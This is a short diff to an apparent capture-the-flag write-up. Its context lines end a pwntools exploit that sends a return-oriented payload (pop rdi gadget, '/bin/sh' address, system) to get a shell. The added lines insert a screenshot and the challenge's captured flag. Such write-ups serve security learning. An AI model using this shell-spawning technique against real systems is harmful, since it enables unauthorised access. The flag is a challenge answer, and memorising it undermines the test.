@@ -195,3 +195,6 @@ p.sendline(padding+p64(pop_rdi)+p64(binsh)+p64(vuln+180)+p64(system))
 p.interactive()
 ```
 
+<figure><img src="../../.gitbook/assets/2022-08-30-230036_1832x633_scrot.png" alt=""><figcaption></figcaption></figure>
+
+Flag :`maple{we_have_so_much_in_common}`
